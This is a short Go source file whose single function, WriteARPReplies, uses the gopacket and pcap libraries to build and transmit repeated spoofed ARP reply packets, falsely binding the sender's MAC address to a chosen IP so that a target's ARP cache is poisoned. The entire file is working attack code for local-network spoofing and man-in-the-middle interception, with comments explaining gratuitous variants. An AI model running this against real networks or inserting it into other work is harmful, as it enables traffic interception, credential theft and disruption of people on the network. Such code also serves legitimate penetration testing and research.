package arp

import (
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// WriteARPReplies sends out a burst of spoofed ARP Reply packets
func WriteARPReplies(handle *pcap.Handle, iface *net.Interface, spoofIP net.IP, targetMAC net.HardwareAddr, targetIP net.IP, packetCount uint) error {
	eth := layers.Ethernet{
		SrcMAC:       iface.HardwareAddr, // The MAC address belonging to your interface
		DstMAC:       targetMAC,          // If gratuitious, this should be the broadcast MAC address
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(iface.HardwareAddr), // The MAC address belonging to your interface
		SourceProtAddress: []byte(spoofIP),            // The IP address that we are spoofing
		DstHwAddress:      targetMAC,                  // If gratuitious, this should be the broadcast MAC address
		DstProtAddress:    []byte(targetIP),           // If gratuitious, this should be equivalent to the spoofIP variable
	}

	// Set up buffer and options for serialization.
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// Write the packets
	for i := 0; i < int(packetCount); i++ {
		gopacket.SerializeLayers(buf, opts, &eth, &arp)
		if err := handle.WritePacketData(buf.Bytes()); err != nil {
			return err
		}
	}
	return nil
}
